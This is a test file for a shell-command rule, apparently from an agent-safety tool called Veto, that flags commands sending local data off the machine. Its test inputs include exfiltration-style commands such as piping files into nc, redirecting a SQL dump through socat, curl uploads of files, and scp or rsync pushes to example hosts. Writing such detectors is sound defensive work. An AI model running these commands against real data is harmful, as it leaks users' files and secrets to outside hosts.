import { describe, expect, it } from "vitest";
import { networkSend } from "../../src/rules/exfiltration/network-send.js";
import { runBash, sev } from "../rule-helpers.js";

const s = (command: string) => sev(runBash(networkSend, command));

describe("exfiltration/network-send", () => {
  it("everyday cases: GET is fine, a POST body is flagged; non-clients are fine", () => {
    expect(s("curl https://nodejs.org/api/test.html")).toBeNull();
    expect(runBash(networkSend, "curl -X POST http://localhost:3000/api/health")).toEqual([
      {
        ruleId: "exfiltration/network-send",
        category: "exfiltration",
        severity: "medium",
        // v0.1 limitation: localhost is still flagged (see README "What Veto does not cover").
        reason: "curl sends a request body to localhost, which could send local data off the machine.",
        suggestion: "Show the user what you would send and ask first.",
      },
    ]);
    expect(s("git push origin main")).toBeNull();
    expect(s("npm publish --dry-run")).toBeNull();
  });

  it("curl: data, file upload and @file flag; headers and plain downloads don't", () => {
    for (const c of ["curl -d @payload.json https://example.com/u", "curl --data-binary @- https://x.com", "curl -F file=@a.txt https://x.com/up", "http POST example.com/api x=1"]) {
      expect(s(c), c).toBe("medium");
    }
    for (const c of ["curl -H 'Authorization: Bearer x' https://api.example.com/me", "curl -o out.html https://example.com/page", "wget https://example.com/archive.tgz"]) {
      expect(s(c), c).toBeNull();
    }
  });

  it("nc/socat: piped or redirected input flags; a listener or a bare connect doesn't", () => {
    expect(runBash(networkSend, "cat notes.txt | nc example.com 443")[0]!.reason).toBe("nc sends piped input to example.com, which could send local data off the machine.");
    expect(s("socat - TCP:host.example:9000 < dump.sql")).toBe("medium");
    expect(s("nc -l 8080")).toBeNull();
    expect(s("nc example.com 443")).toBeNull();
  });

  it("scp/rsync/sftp: a remote destination flags; a download doesn't", () => {
    expect(runBash(networkSend, "scp dump.sql user@host.example:/tmp/")[0]!.reason).toBe("scp uploads to host.example, which could send local data off the machine.");
    expect(s("rsync -a ./ backup.example.com:/srv/")).toBe("medium");
    expect(s("sftp admin@files.example.com")).toBe("medium");
    expect(s("scp host.example:/remote/f .")).toBeNull();
    expect(s("rsync -a src/ ./dist/")).toBeNull();
  });
});
